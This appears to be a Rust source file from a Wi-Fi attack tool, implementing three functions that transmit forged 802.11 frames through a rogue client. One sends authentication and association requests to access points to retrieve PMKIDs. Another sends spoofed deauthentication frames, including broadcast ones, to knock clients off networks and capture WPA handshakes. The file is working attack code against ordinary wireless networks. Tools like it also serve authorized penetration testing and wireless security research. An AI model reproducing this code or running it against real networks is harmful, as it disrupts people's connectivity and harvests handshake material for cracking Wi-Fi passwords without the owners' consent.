// Attack! //

use std::{os::fd::AsRawFd, thread::sleep, time};

use libwifi::frame::{
    components::{MacAddress, RsnAkmSuite, RsnCipherSuite},
    AssociationRequest, Authentication, Beacon, DeauthenticationReason, ProbeRequest,
    ProbeResponse,
};

use crate::{
    devices::{AccessPoint, Station, WiFiDeviceType},
    status::{MessageType, StatusMessage},
    tx::{
        build_association_request, build_association_request_org, build_association_response,
        build_authentication_frame_noack, build_authentication_response,
        build_deauthentication_fm_ap, build_deauthentication_fm_client, build_eapol_m1,
        build_probe_request_undirected, build_probe_response, build_reassociation_request, build_ack,
    },
    write_packet, OxideRuntime,
};

/// M1 Retrieval Attack
/// Authentication => (resp) => Association => (resp) => (M1)
/// Used to (attempt) to retrieve a PMKID.

pub fn m1_retrieval_attack(
    oxide: &mut OxideRuntime,
    ap_mac: &MacAddress,
) -> Result<(), String> {

    if !oxide.targets.is_empty() {
        if !oxide.targets.contains(ap_mac) {
            return Ok(());
        }
    }

    // If we already have a 4whs, don't continue.
    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    { 
        return Ok(()); 
    }

    // get AP object, if there isn't one, return (this shouldn't happen).
    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };
        
    // attempt to get SSID using a probe request if there isn't one.
    if ap_data.ssid.is_none() {
        // Attempt to get the SSID.
        let frx =
            build_probe_request_undirected(&oxide.rogue_client, oxide.counters.sequence2());
            if !oxide.notx {
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
                ap_data.interactions += 1;
            }
    }

    // If the interaction cooldown isn't timed out (aka timer1).
    if !ap_data.auth_sequence.is_t1_timeout() {
        return Ok(());
    }

    // Check state of auth sequence to ensure we are in the right order.
    if ap_data.auth_sequence.state > 0 {
        ap_data.auth_sequence.state = 0; // If t1 is timed out, we gotta reset to state 0.
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("{} state reset to 0", ap_mac),
        ));
    }
    
    // If we already have an M1 for this AP, don't re-attack.
    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
        return Ok(());
    }

    // Ensure the AP uses PSK (from the robust security ie)
    if !ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
        return Ok(());
    }

    // Make an authentication frame (no_ack), so we don't over-send.
    // TODO: Probably add some sort of "noise" flag that uses ack (so we send retries when necessary)
    let frx = build_authentication_frame_noack(
        ap_mac,
        &oxide.rogue_client,
        oxide.counters.sequence2(),
    );

    // If we are transmitting
    if !oxide.notx {
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
        ap_data.interactions += 1;
        ap_data.auth_sequence.state = 1;
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("{} state promoted to 1.", ap_mac),
        ));
        ap_data.update_t1_timer();
        ap_data.update_t2_timer();
    }

    Ok(())
}

pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String>{
    if !oxide.targets.is_empty() {
        if !oxide.targets.contains(ap_mac) {
            return Ok(());
        }
    }
    
    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    { 
        return Ok(()); 
    }

    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    if oxide.notx {
        return Ok(());
    }

    let mut interacted: bool = false;
    let beacon_count = ap_data.beacon_count;

    if (beacon_count % 32) == 0 {

        if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp)
            && ap_data.information.akm_mask()
        {
            let random_client = ap_data
                .client_list
                .get_random()
                .map(|client| client.mac_address.clone());

            if let Some(mac_address) = random_client {
                // Deauth From AP
                let frx = build_deauthentication_fm_ap(
                    ap_mac,
                    &mac_address,
                    oxide.counters.sequence1(),
                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                );
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                // Deauth From Client
                let frx = build_deauthentication_fm_client(
                    ap_mac,
                    &mac_address,
                    oxide.counters.sequence1(),
                    DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
                );
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                interacted = true;
            } else {
                // There is no client
                let frx = build_deauthentication_fm_ap(
                    ap_mac,
                    &MacAddress([255, 255, 255, 255, 255, 255]),
                    oxide.counters.sequence1(),
                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                );
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                interacted = true;
            }
        }    
    }

    // Increment interactions
    if let Some(ap) = oxide.access_points.get_device(ap_mac) {
        // This is here because I couldn't decide if I wanted interacations to match beacons or not...
        if interacted {
            ap.interactions += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!("Attacked Beacon: {}", ap_mac),
            ));
        }
    }
    Ok(())
}


pub fn attack_authentication_from_ap(
    ap_mac: &MacAddress,
    client_mac: &MacAddress,
    oxide: &mut OxideRuntime,
) -> Result<(), String> {
    
    if !oxide.targets.is_empty() {
        if !oxide.targets.contains(ap_mac) {
            return Ok(());
        }
    }

    let ap_data = if let Some(ap) = oxide.access_points.get_device(ap_mac) {
        ap
    } else {
        return Ok(());
    };

    if ap_data.auth_sequence.state != 1 {
        return Ok(());
    }

    if ap_data.auth_sequence.is_t1_timeout() {
        // Reset state to 0 and update timers.
        if ap_data.auth_sequence.state > 0 {
            ap_data.auth_sequence.state = 0;
            ap_data.update_t2_timer();
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!("{} state reset to 0.", ap_mac),
            ));
        }
        return Ok(());
    }

    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
        return Ok(());
    }

    let cs = if ap_data.information.cs_tkip.is_some_and(|f| f) {
        RsnCipherSuite::TKIP
    } else {
        RsnCipherSuite::CCMP
    };
    let gs = if ap_data.information.gs_tkip.is_some_and(|f| f) {
        RsnCipherSuite::TKIP
    } else {
        RsnCipherSuite::CCMP
    };

    let frx: Vec<u8> = build_association_request_org(ap_mac, client_mac,
        ap_mac, oxide.counters.sequence2(), ap_data.ssid.clone(), gs, vec!(cs));

    if !oxide.notx {
        ap_data.auth_sequence.state = 2;
        ap_data.update_t1_timer(); // We interacted
        ap_data.update_t2_timer(); // We changed state
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("{} state promoted to 2.", ap_mac),
        ));
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
        ap_data.interactions += 1;
    }
    Ok(())
}

